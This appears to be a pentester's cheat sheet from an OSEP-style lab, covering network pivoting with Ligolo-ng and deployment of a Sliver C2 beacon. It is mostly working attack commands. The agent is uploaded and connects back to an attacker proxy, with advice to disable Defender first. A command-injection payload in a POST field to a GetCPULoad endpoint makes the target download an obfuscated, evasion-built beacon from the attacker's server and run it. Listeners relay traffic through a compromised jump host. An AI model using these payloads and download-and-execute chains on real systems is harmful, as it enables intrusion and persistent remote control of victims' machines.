# Ligolo

#### TIP: Make sure defender is disabled or ligolo might get removed

## Subnet Access

### 1) Upload the agent

    upload /home/kali/tools/ligolo-ng/agent.exe c:/windows/tasks/agent.exe
    ls c:/windows/tasks/agent.exe

### 2) Start the ligolo proxy on kali

    sudo /home/kali/tools/ligolo-ng/proxy -selfcert -laddr 10.10.10.11:4444


### 3) Delete the interfaces if already exist (in case ip ranges change on next connection)

    interface_delete --name osep-challenge
    interface_delete --name osep-challenge-vault

### 4) After starting, create a interface and assign route

    interface_create --name osep-challenge
    interface_route_add --name osep-challenge --route 10.10.100.0/24


### 5) Add another one

    interface_create --name osep-challenge-vault
    interface_route_add --name osep-challenge-vault --route 10.10.200.25/32

### 6) Connect from the victim machine back to attacker machine with interactive shell

    shell
    C:\Windows\tasks\agent.exe -connect 10.10.10.11:21 -ignore-cert -retry


Or run directly, will have to Ctrl + C and launch sliver again, don't worry though the process will keep running!

    execute -t 1000 -o C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -retry

If you use it without -o it won't wait for console output and no need to ctrl + c

    execute C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -retry

### 7) Select the session

    session


### 8) Start the tunnel 

    tunnel_start --tun osep-challenge
    tunnel_start --tun osep-challenge-vault

## Port Forwarding

In this scenario the machine machine05 can't access our machine kali but can access jump01 and we have compromised jump01

machine05 -> jump01:8000 -> kali:80 to download sliver implant from our apache2 server
machine05 -> jump01:8088 -> kali:8088 - for sliver beaconing

### 1) Create listener (from jump01:8000 -> kali:80)

    listener_add --addr 10.10.250.10:8000 --to 0.0.0.0:80

### 2) We'll use the IP of Jump01 - 10.10.250.10

    curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe curl http://10.10.250.10:8000/;#'

### 3) Generate sliver beacon - IP of jump01

    generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion

### 4) Get the sliver beacon

    sudo python3 -m http.server 80
    sudo chmod 777 /var/www/html/sliver.obfuscated.exe

### 5) Get shell access

    curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe curl http://10.10.250.10:8000/sliver.obfuscated.exe -O C:\Windows\temp\sliver.obfuscated2.exe ;#'
    curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);powershell.exe ls C:\Windows\temp\sliver.obfuscated2.exe ;#'

### 6) Create another listener (from jump01:8090 -> sliver:8088)

    listener_add --addr 10.10.250.10:8088 --to 10.10.10.11:8088

### 7) Run the .exe

    curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X POST -d 'machine05 -Class Win32_Processor);cmd.exe /c C:\Windows\temp\sliver.obfuscated2.exe ;#'
